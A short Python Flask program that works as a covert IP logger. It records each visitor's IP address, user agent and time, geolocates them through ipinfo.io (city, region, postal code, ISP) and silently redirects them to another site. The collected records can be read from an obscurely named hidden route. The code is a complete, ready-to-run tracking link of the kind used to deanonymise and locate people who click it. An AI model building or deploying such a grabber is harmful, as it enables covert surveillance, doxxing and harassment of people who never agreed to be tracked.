from flask import Flask, request, redirect, render_template_string
import requests
from datetime import datetime

app = Flask(__name__)

def get_ip_info(ip):
    try:
        res = requests.get(f'https://ipinfo.io/{ip}/json')
        return res.json()
    except:
        return {}
    

logs = []

@app.route('/', methods=['GET', 'POST'])
def log_ip():
    # Get the IP of the visitor
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    # Get the user agent info (browser/OS)
    user_agent = request.headers.get('User-Agent')
    # Get the time of the request
    time_now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Get additional info about the IP
    ip_info = get_ip_info(ip)
    city = ip_info.get('city', 'Unknown')
    country = ip_info.get('country', 'Unknown')
    postal_code = ip_info.get('postal', 'Unknown')  # Postal code
    region = ip_info.get('region', 'Unknown')  # Region info
    org = ip_info.get('org', 'Unknown')  # Organization info

    # Log the request info
    log_data = f"""
--- New Visitor ---
Time      : {time_now}
IP        : {ip}
City      : {city}
Country   : {country}
Region    : {region}
Postal    : {postal_code}
ISP       : {org}
UserAgent : {user_agent}
---------------------
"""
    print(log_data)
    logs.append(log_data if log_data not in logs else '')

    # Save to a file
    with open('log.txt', 'a') as f:
        f.write(log_data + '\n')

    return redirect('https://shieldrover.com')


@app.route('/3.14159265358979323846Oozclanontop1')
def pi():
    return '\n\n'.join(logs)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=54000)
